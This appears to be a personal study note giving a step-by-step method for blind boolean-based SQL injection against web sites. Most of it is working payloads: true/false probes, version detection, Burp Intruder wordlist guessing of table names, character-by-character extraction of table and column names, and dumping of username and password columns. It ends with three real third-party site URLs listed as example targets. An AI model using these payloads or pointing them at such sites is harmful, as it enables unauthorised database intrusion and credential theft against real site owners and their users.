# <mark style="background: #FF5582A6;">Prerequisite :</mark>
[[6-Limit (Method)]]
[[7-Like (Method)]]
Knowing How To Work With Burp Suite 
[[9-Version 4]]

# Description :
- In this method, nothing is printed on the site page.
- No result is displayed on the site page.
- This method works based on conditional commands, That is based on the site is loaded or not, or the site gives an error or not.

# How To Do :
## Step 1 :

with this command code, The site should be loaded :
- <mark style="background: #FFB86CA6;">and 1=1-- Or and true--</mark> 

with this command code, The site shouldn't be loaded.
- <mark style="background: #FFB86CA6;">and 1=2-- Or and false--</mark> 

<mark style="background: #FF5582A6;">In other words, the result of these two commands must be different to confirm the possibility of this vulnerability.</mark> 

## Step 2 :

- <mark style="background: #FFB86CA6;">and substring(@@version,1,1)=4/5/8/1</mark> 

With this command, we intend to find out the version of the site. In this way, when the site is loaded with any of the above numbers (4,5,8,10), that number is the first character of the site version and we understand the version of the target site.
<mark style="background: #FF5582A6;">(With this step, we make sure that the desired site has this vulnerability)</mark> 

## Step 3 :

At this step, we need to find the name of the important table.

1. Guess the name of the important table :
	- Our own guess instead of x :

- <mark style="background: #FFB86CA6;">and (select 1 from x limit 0,1)=1--</mark> 

	- Using Burp Suite similar to [[9-Version 4]] :

- <mark style="background: #FFB86CA6;">and (select 1 from x limit 0,1)=1--</mark> 

- <mark style="background: #FF5582A6;">Important Point :</mark> 
	we use Burp Suite for to guess the important table as follows :
	1. in the first step, we put <mark style="background: #FF5582A6;">aaaa</mark> instead of <mark style="background: #FF5582A6;">x</mark> and run it in Burp Suite.
	2. from the proxy section, right-click and click : <mark style="background: #FF5582A6;">send to intruder</mark> .
	3. first of all, click <mark style="background: #FF5582A6;">clear</mark> and <mark style="background: #FF5582A6;">select aaaa</mark> and click <mark style="background: #FF5582A6;">add</mark> .
	4. <mark style="background: #FF5582A6;">payload</mark> section ---> the <mark style="background: #FF5582A6;">set</mark> part should be on <mark style="background: #FF5582A6;">1</mark> and the <mark style="background: #FF5582A6;">type</mark> part should be on <mark style="background: #FF5582A6;">runtime file</mark> .
	5. we give it <mark style="background: #FF5582A6;">the list of tables</mark> we have.
	   (E: \ PEDRAM \ Web Pentest \ Tables (Burp Suite).txt) or [[Tables (Burp Suite)]]
	6. click <mark style="background: #FF5582A6;">START</mark> .
	7. our answer is the word that the <mark style="background: #FF5582A6;">length has more than other</mark> .
	   (7000s are errors)

2. The combined method of [[7-Like (Method)]] and [[2-Sql Injection (Basic)]] and blind :

- <mark style="background: #FFB86CA6;">and ascii(substring((select table_name from information_schema.columns where column_name like '%pas%' limit 0,1),1,1))>100--</mark> 

	### <mark style="background: #FF5582A6;">Point 1 :</mark> 
	'%pas%' must be hexed. the %pas% is hexed = <mark style="background: #FF5582A6;">0x2570617325</mark> )

	### <mark style="background: #FF5582A6;">Point 2 :</mark> 
	Like method searches all databases of the site to find the important table, So in the last step, if the important table isn't from the default database, <mark style="background: #FF5582A6;">The name of the database in which the table existed must be written before the important table.</mark> 

	### <mark style="background: #FF5582A6;">Point 3 :</mark> 
	Command code to find site databases :

	- <mark style="background: #FFB86CA6;">and ascii(substring((select schema_name from information_schema.schemata limit 1,1),1,1))>100-- </mark> 

3. Using Python codes written for this :

- <mark style="background: #FF5582A6;">E:\PEDRAM\Web Pentest\13-blind.py</mark> 
- <mark style="background: #FF5582A6;">for start, in cmd type : python 13-blind.py</mark> 

4. If the above three methods don't work, we will use this command code :

- <mark style="background: #FFB86CA6;">and ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>A--</mark> 


	### <mark style="background: #FF5582A6;">Full explanation about the use of limit in this method :</mark> 
	
<mark style="background: #FF5582A6;">	The first limit in the above codes is the first table or the first column of the site.
	The second limit is to display one by one the characters of that table or column.
	So first, we increase the number on the left side of the second limit, and when we know the full name of the first table or column, we add a number to the number on the left side of the first limit and repeat the previous work.
	in this way, we extract the names of tables or columns of the site one by one.</mark> 


  - <mark style="background: #FF5582A6;">Explanation for the ascii and the ">number" at the end of the command :</mark> 

<mark style="background: #FF5582A6;">	We want to convert the first character we get, into the ascii code, To compare this number with another number at the end of our code and finally, convert the confirmed number into English letters and special characters.
	(for example : a=97 or b=98 or c=99).
	We compare the converted ascii code with the last number of our command.
	First, we get a range between the number of the character we want, and then when we find the number, we put = instead of > to make sure that the site will be loaded with this number.
	When the site is loaded correctly, we convert the found number into letters or special characters and with this we have obtained one of the characters of the tables or columns of the site. </mark> 

## Step 4 :

1. Guess the name of the important column :
   the name of the important column like :
   - user
   - username
   - login
   - password
   - passwd
   - pass
   - and etc

   - Our own guess instead of y :
   
	- <mark style="background: #FFB86CA6;">and (select substring(concat(1,y),1,1) from 'important table' limit 0,1)=1-- </mark> 

   - Using Burp Suite similar to [[9-Version 4]] :

	- <mark style="background: #FFB86CA6;">and (select substring(concat(1,y),1,1) from 'important table' limit 0,1)=1--</mark> 
	
	- <mark style="background: #FF5582A6;">we use Burp Suite for to guess the important columns as explained in the important point of the above step</mark> 

2. if the above methods don't work, we will use this command code :

      - <mark style="background: #FFB86CA6;">and ascii(substring((select column_name from information_schema.columns where table_name='important table' limit 0,1),1,1))>97--</mark> 

## Step 5 :

extract information :

- <mark style="background: #FFB86CA6;">and ascii(substring((select concat(important column) from important table limit 0,1),1,1))>A</mark> 

When we found the important table and column. We use Burp Suite for convenience and high speed in doing our work as follows :

  1. in the first step, we put =1 instead of >A at the of code to find out if the table we found is in the default database or not? (because Like method searches all databases of the site to find the important table, So in the last step, if the important table isn't from the default database, <mark style="background: #FF5582A6;">The name of the database in which the table existed must be written before the important table.</mark> )
  2. from the proxy section, right-click and click : send to intruder .
  3. first of all, click clear and select =1 and write =100 and select it and click add .
  4. payload section ---> the set part should be on 1 and the type part should be on numbers .
  5. from 25 to 127 or from 90 to 127
  6. click START .
  7. our answer is the word that the length has more than other .
	   (7000s are errors)
  8. We increase the number on the left side of the second limit one by one to get all the characters of the user or password.
     (For example, if the password is a md5 hash, we need to get 32 characters with Burp Suite.)

# Example :
1. https://www.asteria.ru/en/news/news.php?news_id=448
2. https://dovermainstreet.org/program.php?id=6
3. http://www.galeriemolinas.com/artist.php?id=125